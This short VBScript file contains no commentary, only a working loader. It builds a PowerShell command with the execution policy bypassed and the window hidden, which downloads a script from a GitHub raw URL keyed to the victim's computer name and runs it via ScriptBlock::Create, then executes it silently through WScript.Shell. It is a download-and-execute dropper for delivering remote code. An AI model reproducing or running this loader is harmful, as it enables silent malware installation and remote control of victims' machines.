Dim shell, psCode, exeCmd
psCode = "$k=$env:computername;$a=(New-Object Net.WebClient).DownloadString('https://github.com/bormanye/chseirfkks/raw/refs/heads/main/'+$k+'/help.ini');$b=[ScriptBlock]::Create($a);& $b;"
exeCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -w 1 -Command """ & psCode & """"
MsgBox exeCmd
Set shell = CreateObject("WScript.Shell")
shell.Run exeCmd, 0, False
Set shell = Nothing
